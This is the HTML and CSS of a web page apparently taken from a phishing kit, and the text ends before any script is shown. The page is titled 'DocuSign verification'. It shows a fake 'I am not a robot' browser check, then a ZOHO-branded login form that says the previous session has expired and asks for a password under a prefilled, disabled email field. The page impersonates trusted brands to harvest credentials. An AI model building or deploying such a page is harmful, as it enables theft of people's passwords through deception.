<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DocuSign verification</title>
  <!-- Include Bootstrap 5 CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <!-- Bootstrap Icons -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
  <!-- Google Fonts: Poppins -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">

  <style>
    /* Hide the main content initially */
    #main-content {
      display: none;
    }

    /* Verification Div Styling */
    #verification-div {
      height: 100vh;
      display: flex;
      align-items: start;
      justify-content: center;
      padding-top: 10%;
    }

    /* Ensure text is left-aligned */
    .verification-content {
      text-align: left;
    }

    /* Adjust spinner size */
    .spinner-border {
      width: 1.5rem;
      height: 1.5rem;
    }
  </style>



  <style>
    #background-iframe,
    #overlay {
      position: fixed;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%
    }

    body {
      font-family: Poppins, sans-serif;
      margin: 0;
      padding: 0;
      overflow: hidden
    }

    #background-iframe {
      border: none;
      z-index: -3;
      object-fit: cover
    }

    #overlay {
      background-color: rgba(0, 0, 0, .5);
      z-index: -2
    }

    .form-container {
      display: none;
      max-width: 400px;
      width: 100%;
      padding: 2rem;
      background-color: rgba(255, 255, 255, .95);
      border-radius: .75rem;
      box-shadow: 0 8px 16px rgba(0, 0, 0, .2);
      position: relative;
      z-index: 1
    }

    .icon-text {
      display: flex;
      align-items: center;
      margin-bottom: 1.5rem
    }

    .icon-text img {
      width: 32px;
      height: 32px;
      margin-right: .5rem
    }

    .icon-text .h4 {
      margin-bottom: 0;
      color: #0d6efd
    }

    .form-floating {
      position: relative;
      margin-bottom: 1.5rem
    }

    .form-floating label,
    .input-icon {
      position: absolute;
      color: #6c757d;
      pointer-events: none
    }

    .form-floating label {
      transition: .2s ease-in-out;
      left: 2.5rem;
      top: -.2rem;
      background-color: transparent;
      z-index: 1
    }

    .form-floating input:focus+label,
    .form-floating input:not(:placeholder-shown)+label {
      transform: translateY(-1.5rem);
      font-size: .85rem;
      color: #0d6efd
    }

    .form-control {
      border-top: none;
      border-left: none;
      border-right: none;
      border-bottom: 2px solid #ced4da;
      border-radius: 0;
      padding-left: 2.5rem;
      transition: border-color .2s;
      background-color: transparent
    }

    .form-control:focus {
      box-shadow: none;
      outline: 0;
      border-bottom-color: #0d6efd
    }

    .input-icon {
      left: .75rem;
      top: 50%;
      transform: translateY(-50%);
      font-size: 1.2rem
    }

    .btn-primary {
      width: 100%;
      padding: .75rem;
      font-size: 1rem;
      background-color: #0d6efd;
      border: none;
      border-radius: .375rem;
      transition: background-color .3s, color .3s
    }

    .btn-primary:hover {
      background-color: #0b5ed7;
      color: #fff
    }

    .btn-primary:focus {
      box-shadow: none
    }

    @media (max-width:576px) {
      .form-container {
        padding: 1.5rem
      }
    }

    .loader-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, .5);
      align-items: center;
      justify-content: center;
      z-index: 9999;
      display: none
    }

    .error-message {
      color: red;
      margin-bottom: 1rem;
      display: none
    }
  </style>



</head>

<body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
  <div id="verification-div" style="position:absolute;height:100vh; width:100vw;background-color: #fff;">
    <div class="row">
      <div class="col-12 verification-content mx-2">
        <h2>Checking your browser before accessing the site</h2>
        <div>
          <div class="checkbox-container mt-3 d-flex align-items-center p-4"
            style="border:0px solid black;background: #f3efef;border-radius:5px;">
            <input type="checkbox" id="bot-check" class="form-check-input">
            <label for="bot-check" class="form-check-label ms-2">I am not a robot</label>
          </div>
        </div>

        <p class="pt-1">click on the checkbox to verify if you're human.</p>
      </div>
    </div>
  </div>
  <!-- Background Iframe -->
  <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
  <!-- Dimmed Overlay -->
  <div id="overlay"></div>
  <!-- Form Container -->
  <div class="form-container" id="form-container">
    <!-- Error Message -->
    <div id="error-message" class="error-message">Try again</div>

    <form id="user-form">
      <!-- Icon and Text Row -->
      <div class="icon-text">
        <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon"
          style="height: 15px; width:15px;">
        <span class="h4 mb-0" style="margin-left: 10px;" id="domain-name">ZOHO</span>
      </div>
      <!-- Heading -->
      <h5 class="mb-3">Let's get started</h5>
      <!-- Paragraph -->
      <p class="mb-4 text-muted" style="font-size: .8rem;">Previous session has expired, login to continue</p>

      <!-- Email Input -->
      <div class="form-floating position-relative">
        <i class="bi bi-envelope input-icon"></i>
        <input type="email" class="form-control" id="email" placeholder=" " required
          style="padding-left: 40px; z-index:1000;" disabled>
        <label for="email" style="background-color: transparent;">Email</label>
      </div>
      <!-- Password Input -->
      <div class="form-floating position-relative">
        <i class="bi bi-lock input-icon"></i>
        <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
        <label for="password" style="background-color: transparent;">Password</label>
      </div>
      <!-- Submit Button -->
      <button type="submit" class="btn btn-primary">Next</button>
    </form>
  </div>

  <!-- Loader Overlay -->
  <div id="loader-overlay" class="loader-overlay">
    <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
      <span class="visually-hidden">Loading...</span>
    </div>
  </div>

  <!-- Bootstrap 5 JS Bundle (includes Popper) -->
